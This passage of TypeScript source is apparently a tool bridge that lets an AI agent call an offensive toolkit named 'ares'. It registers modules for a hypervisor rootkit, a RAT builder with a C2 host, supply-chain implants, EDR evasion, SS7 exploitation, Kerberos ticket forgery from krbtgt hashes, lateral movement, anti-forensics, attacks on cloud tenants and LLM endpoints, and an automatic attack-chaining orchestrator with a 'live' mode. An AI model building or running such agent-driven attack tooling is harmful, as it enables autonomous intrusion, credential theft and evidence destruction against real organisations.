    const { deployHypervisorRootkit } = await import("./ares/hypervisor_rootkit.ts")
    const r = await deployHypervisorRootkit({ live: ctx.live, esxiHost: params.esxi_host as string | undefined, keyId: params.key_id as string | undefined })
    return result("ares_hypervisor_rootkit", "deployHypervisorRootkit", ctx, r, r.artifacts.length > 0)
  },
  ares_airgap_bridge: async (ctx, params) => {
    const { runAirgapBridge } = await import("./ares/airgap_bridge.ts")
    const r = await runAirgapBridge({ live: ctx.live, payload: params.payload as string | undefined, channel: params.channel as "usb" | "rf" | "acoustic" | "all" | undefined })
    return result("ares_airgap_bridge", "runAirgapBridge", ctx, r, r.channels.length > 0)
  },
  ares_rat_builder: async (ctx, params) => {
    const { buildRat } = await import("./ares/rat_builder.ts")
    const r = await buildRat({ live: ctx.live, protocol: params.protocol as "custom_binary" | "https" | "dns" | "websocket" | undefined, c2Host: params.c2_host as string | undefined, c2Port: Number(params.c2_port ?? 8443) })
    return result("ares_rat_builder", "buildRat", ctx, r, r.artifacts.length > 0)
  },
  ares_supply_chain_implant: async (ctx, params) => {
    const { runSupplyChainImplant } = await import("./ares/supply_chain_implant.ts")
    const r = await runSupplyChainImplant({ live: ctx.live, package: params.package as string | undefined, projectDir: params.project_dir as string | undefined, ecosystem: params.ecosystem as string | undefined })
    return result("ares_supply_chain_implant", "runSupplyChainImplant", ctx, r, r.steps.some((s) => s.success))
  },
  ares_evasion_engine: async (ctx, params) => {
    const { runEvasionEngine } = await import("./ares/evasion_engine.ts")
    const r = await runEvasionEngine({ live: ctx.live, targetEdr: params.target_edr as string | undefined })
    return result("ares_evasion_engine", "runEvasionEngine", ctx, r, r.techniques.length > 0)
  },
  ares_satellite_c2: async (ctx, params) => {
    const { deploySatelliteC2 } = await import("./ares/satellite_c2.ts")
    const r = await deploySatelliteC2({ live: ctx.live, vsatHost: params.vsat_host as string | undefined, frontDomain: params.front_domain as string | undefined })
    return result("ares_satellite_c2", "deploySatelliteC2", ctx, r, r.artifacts.length > 0)
  },
  ares_ss7_exploit: async (ctx, params) => {
    const { runSs7Exploit } = await import("./ares/ss7_exploit.ts")
    const r = await runSs7Exploit({ live: ctx.live, msisdn: params.msisdn as string | undefined, gt: params.gt as string | undefined })
    return result("ares_ss7_exploit", "runSs7Exploit", ctx, r, r.operations.length > 0)
  },
  ares_hardware_implant: async (ctx, params) => {
    const { deployHardwareImplant } = await import("./ares/hardware_implant.ts")
    const r = await deployHardwareImplant({ live: ctx.live, type: params.type as "usb" | "rf" | "sdr" | "all" | undefined })
    return result("ares_hardware_implant", "deployHardwareImplant", ctx, r, r.artifacts.length > 0)
  },
  ares_kerberos_advanced: async (ctx, params) => {
    const { runKerberosAdvanced } = await import("./ares/kerberos_advanced.ts")
    const r = await runKerberosAdvanced({ live: ctx.live, domain: params.domain as string | undefined, domainSid: params.domain_sid as string | undefined, krbtgtHash: params.krbtgt_hash as string | undefined, dcMachineHash: params.dc_machine_hash as string | undefined })
    return result("ares_kerberos_advanced", "runKerberosAdvanced", ctx, r, r.techniques.length > 0)
  },
  ares_persistence_advanced: async (ctx, params) => {
    const { installAdvancedPersistence } = await import("./ares/persistence_advanced.ts")
    const r = await installAdvancedPersistence({ live: ctx.live, os: params.os as "windows" | "linux" | undefined, payload: params.payload as string | undefined })
    return result("ares_persistence_advanced", "installAdvancedPersistence", ctx, r, r.mechanisms.length > 0)
  },
  ares_lateral_scale: async (ctx, params) => {
    const { runLateralScale } = await import("./ares/lateral_scale.ts")
    const r = await runLateralScale({ live: ctx.live, target: String(params.target ?? hostFromTarget(ctx.target)), domain: params.domain as string | undefined, username: params.username as string | undefined, password: params.password as string | undefined })
    return result("ares_lateral_scale", "runLateralScale", ctx, r, r.steps.some((s) => s.success))
  },
  ares_anti_forensics_advanced: async (ctx, params) => {
    const { runAntiForensicsAdvanced } = await import("./ares/anti_forensics_advanced.ts")
    const r = await runAntiForensicsAdvanced({ live: ctx.live, pathsToTimestomp: params.paths as string[] | undefined })
    return result("ares_anti_forensics_advanced", "runAntiForensicsAdvanced", ctx, r, r.actions.length > 0)
  },
  ares_network_exploit: async (ctx, params) => {
    const { runNetworkExploit } = await import("./ares/network_exploit.ts")
    const r = await runNetworkExploit({ live: ctx.live, interface: params.interface as string | undefined, targetNetwork: params.network as string | undefined })
    return result("ares_network_exploit", "runNetworkExploit", ctx, r, r.attacks.length > 0)
  },
  ares_cloud_native: async (ctx, params) => {
    const { runCloudNativeAttack } = await import("./ares/cloud_native.ts")
    const r = await runCloudNativeAttack({ live: ctx.live, tenant: params.tenant as string | undefined, subscription: params.subscription as string | undefined })
    return result("ares_cloud_native", "runCloudNativeAttack", ctx, r, r.platforms.length > 0)
  },
  ares_ai_ml_attacks: async (ctx, params) => {
    const { runAiMlAttacks } = await import("./ares/ai_ml_attacks.ts")
    const r = await runAiMlAttacks({ live: ctx.live, targetUrl: params.target_url as string | undefined, llmEndpoint: params.llm_endpoint as string | undefined })
    return result("ares_ai_ml_attacks", "runAiMlAttacks", ctx, r, r.steps.some((s) => s.success) || r.capabilities.length > 0)
  },
  ares_orchestrator: async (ctx, params) => {
    const { runAresOrchestrator } = await import("./ares/orchestrator.ts")
    const r = await runAresOrchestrator({
      live: ctx.live,
      target: String(params.target ?? hostFromTarget(ctx.target)),
      domain: params.domain as string | undefined,
      projectDir: params.project_dir as string | undefined,
      autoChain: params.auto_chain !== false && params.auto_chain !== "false",
    })
    return result("ares_orchestrator", "runAresOrchestrator", ctx, r, r.succeeded > 0)
  },
  ares_auto_chain: async (ctx, params) => {
    const { runAresAutoChain } = await import("./ares/_chain.ts")
    const { CredentialGraph } = await import("./credential_graph.ts")
    const r = await runAresAutoChain({
      live: ctx.live,
      target: String(params.target ?? hostFromTarget(ctx.target)),
      domain: params.domain as string | undefined,
      credGraph: ctx.credGraph ?? CredentialGraph.load(),
      skipHarvest: params.skip_harvest === true || params.skip_harvest === "true",
    })
    return result("ares_auto_chain", "runAresAutoChain", ctx, r, r.phases.some((p) => p.success && !p.skipped))
  },
  ares_dispatch: async (ctx, params) => {
    const module = String(params.module ?? params.action ?? "")
    if (!module) {
      return result("ares_dispatch", "route", ctx, { error: "module required" }, false)
    }
    const candidates = [module, module.startsWith("ares_") ? module : `ares_${module}`, module.replace(/^ares_/, "")]
    for (const name of [...new Set(candidates)]) {
      const fn = MODULE_BRIDGE[name]
      if (fn) {
        const r = await fn(ctx, params)
        return { ...r, tool: "ares_dispatch", command: `→${name}` }
      }
    }
    return result("ares_dispatch", "route", ctx, { error: `unknown module: ${module}` }, false)
  },
  ares_phase: async (ctx, params) => {
    const { runAresPhase } = await import("./ares/phase_runner.ts")
    const phase = String(params.phase ?? "recon") as import("./mcp_efficiency.ts").AresPhase
    const r = await runAresPhase({
      phase,
      target: String(params.target ?? hostFromTarget(ctx.target)),
      live: ctx.live,
      domain: params.domain as string | undefined,
    })
    return result("ares_phase", `phase:${phase}`, ctx, r, r.succeeded > 0)
  },
}

export function bridgedToolNames(): string[] {
  return Object.keys(MODULE_BRIDGE)
}

export async function runBridgedModule(
  ctx: AgentToolContext,
  toolName: string,
  params: Record<string, unknown> = {},
): Promise<ToolRunResult | null> {
  const fn = MODULE_BRIDGE[toolName]
  if (!fn) return null
  return fn(ctx, params)
}

export default { MODULE_BRIDGE, bridgedToolNames, runBridgedModule }
